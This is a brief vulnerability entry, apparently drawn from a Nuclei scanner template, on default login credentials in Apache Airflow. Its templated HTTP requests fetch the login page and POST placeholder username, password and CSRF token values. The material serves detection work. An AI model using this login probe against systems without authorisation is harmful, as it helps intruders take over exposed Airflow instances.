# Vulnerability: Apache Airflow Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`airflow-default-login.yaml`)

## Description
Apache Airflow default login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/admin/airflow/login

username={{username}}&password={{password}}&_csrf_token={{csrf_token}}
```

